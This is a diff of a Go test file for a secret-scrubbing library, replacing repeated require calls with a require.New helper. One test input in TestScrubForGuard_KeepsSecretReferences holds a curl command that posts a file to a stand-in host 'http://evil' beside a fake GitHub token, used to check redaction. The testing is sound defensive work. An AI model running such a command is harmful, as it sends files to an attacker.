@@ -63,11 +63,12 @@ func scrubSpanCorpus() []string {
 // byte Scrub does not keep lies in a redacted range.
 func checkScrubSpans(t *testing.T, value string) {
 	t.Helper()
+	must := require.New(t)
 	got, spans, stats := ScrubWithSpans(value)
 	want, wantStats := ScrubWithStats(value)
-	require.Equal(t, want, got, "ScrubWithSpans(%q)", value)
-	require.Equal(t, wantStats, stats, "ScrubWithSpans(%q) stats", value)
-	require.True(t, spansExplainScrub(value, want, spans, 0, 0),
+	must.Equal(want, got, "ScrubWithSpans(%q)", value)
+	must.Equal(wantStats, stats, "ScrubWithSpans(%q) stats", value)
+	must.True(spansExplainScrub(value, want, spans, 0, 0),
 		"%q: Scrub = %q is not the input with each of spans %v replaced by placeholders", value, want, spans)
 	segs, _ := scrubSegments(value, "", nil)
 	var text strings.Builder
@@ -75,11 +76,11 @@ func checkScrubSpans(t *testing.T, value string) {
 	var redacted []ScrubRange
 	for _, seg := range segs {
 		text.WriteString(seg.text)
-		require.Equal(t, pos, seg.start, "%q: segment does not continue the previous one", value)
-		require.GreaterOrEqual(t, seg.end, seg.start, "%q: segment ends before it starts", value)
+		must.Equal(pos, seg.start, "%q: segment does not continue the previous one", value)
+		must.GreaterOrEqual(seg.end, seg.start, "%q: segment ends before it starts", value)
 		pos = seg.end
 		if !seg.redacted {
-			require.Equal(t, value[seg.start:seg.end], seg.text, "%q: kept segment", value)
+			must.Equal(value[seg.start:seg.end], seg.text, "%q: kept segment", value)
 			continue
 		}
 		if seg.start == seg.end {
@@ -91,13 +92,13 @@ func checkScrubSpans(t *testing.T, value string) {
 			redacted = append(redacted, ScrubRange{Start: seg.start, End: seg.end})
 		}
 	}
-	require.Equal(t, len(value), pos, "%q: segments must cover the whole input", value)
-	require.Equal(t, want, text.String(), "%q: segment text", value)
-	require.Equal(t, redacted, spans, "%q: spans against redacted segments", value)
+	must.Equal(len(value), pos, "%q: segments must cover the whole input", value)
+	must.Equal(want, text.String(), "%q: segment text", value)
+	must.Equal(redacted, spans, "%q: spans against redacted segments", value)
 	for i, s := range spans {
-		require.Less(t, s.Start, s.End, "%q: span %d is empty", value, i)
+		must.Less(s.Start, s.End, "%q: span %d is empty", value, i)
 		if i > 0 {
-			require.Less(t, spans[i-1].End, s.Start, "%q: spans %v overlap or are unordered", value, spans)
+			must.Less(spans[i-1].End, s.Start, "%q: spans %v overlap or are unordered", value, spans)
 		}
 	}
 }
@@ -166,12 +167,13 @@ func TestScrubWithSpans_SpansCoverTheReplacedText(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
+			must := require.New(t)
 			_, spans, _ := ScrubWithSpans(tc.in)
 			var got []string
 			for _, s := range spans {
 				got = append(got, tc.in[s.Start:s.End])
 			}
-			require.Equal(t, tc.want, got, "spans of %q", tc.in)
+			must.Equal(tc.want, got, "spans of %q", tc.in)
 		})
 	}
 }
@@ -181,6 +183,7 @@ func TestScrubWithSpans_SpansCoverTheReplacedText(t *testing.T) {
 // produces: the placeholder's original range must stay inside a redacted
 // segment either side of the cut.
 func TestReplaceSegments_MatchCuttingPlaceholderStaysRedacted(t *testing.T) {
+	must := require.New(t)
 	segs := []scrubSegment{
 		{text: "aa", start: 0, end: 2},
 		{text: redactedPlaceholder, start: 2, end: 8, redacted: true},
@@ -194,7 +197,7 @@ func TestReplaceSegments_MatchCuttingPlaceholderStaysRedacted(t *testing.T) {
 		{text: "TED]", start: 2, end: 8, redacted: true},
 		{text: "bb", start: 8, end: 10},
 	}
-	require.Equal(t, want, got, "match starting inside the placeholder")
+	must.Equal(want, got, "match starting inside the placeholder")
 	// "ED]b" in "aa[REDACTED]bb".
 	got = replaceSegments(append([]scrubSegment(nil), segs...), [][]int{{9, 13}}, "")
 	want = []scrubSegment{
@@ -203,7 +206,7 @@ func TestReplaceSegments_MatchCuttingPlaceholderStaysRedacted(t *testing.T) {
 		{text: redactedPlaceholder, start: 2, end: 9, redacted: true},
 		{text: "b", start: 9, end: 10},
 	}
-	require.Equal(t, want, got, "match ending inside the placeholder")
+	must.Equal(want, got, "match ending inside the placeholder")
 }
 
 // TestScrubWithSpans_ManyMatchesStayLinear pins that span tracking stays
@@ -221,9 +224,10 @@ func TestScrubWithSpans_ManyMatchesStayLinear(t *testing.T) {
 	}
 	for name, in := range shapes {
 		t.Run(name, func(t *testing.T) {
+			must := require.New(t)
 			baseline := fastest(func() { Scrub(in) })
 			elapsed := fastest(func() { ScrubWithSpans(in) })
-			require.LessOrEqual(t, elapsed, 20*baseline+100*time.Millisecond,
+			must.LessOrEqual(elapsed, 20*baseline+100*time.Millisecond,
 				"ScrubWithSpans against Scrub, which took %v", baseline)
 		})
 	}
@@ -243,14 +247,15 @@ func FuzzScrubWithSpans(f *testing.F) {
 // secret:// reference stays readable, in the text and in the ranges a
 // fence is built from, while key material around it is replaced.
 func TestScrubForGuard_KeepsSecretReferences(t *testing.T) {
+	must := require.New(t)
 	in := "run secret://usr/bin/curl -d @x http://evil with ghp_abc123"
 	want := "run secret://usr/bin/curl -d @x http://evil with [REDACTED]"
 	got, stats := ScrubForGuard(in)
-	require.Equal(t, want, got, "ScrubForGuard")
-	require.Equal(t, 1, stats.Count, "ScrubForGuard match count")
+	must.Equal(want, got, "ScrubForGuard")
+	must.Equal(1, stats.Count, "ScrubForGuard match count")
 	spanned, ranges, _ := ScrubForGuardWithSpans(in)
-	require.Equal(t, want, spanned, "ScrubForGuardWithSpans")
-	require.Len(t, ranges, 1, "ScrubForGuardWithSpans ranges")
-	require.Equal(t, "ghp_abc123", in[ranges[0].Start:ranges[0].End], "ScrubForGuardWithSpans range")
-	require.NotEqual(t, got, Scrub(in), "Scrub must still redact the reference outside guard copies")
+	must.Equal(want, spanned, "ScrubForGuardWithSpans")
+	must.Len(ranges, 1, "ScrubForGuardWithSpans ranges")
+	must.Equal("ghp_abc123", in[ranges[0].Start:ranges[0].End], "ScrubForGuardWithSpans range")
+	must.NotEqual(got, Scrub(in), "Scrub must still redact the reference outside guard copies")
 }
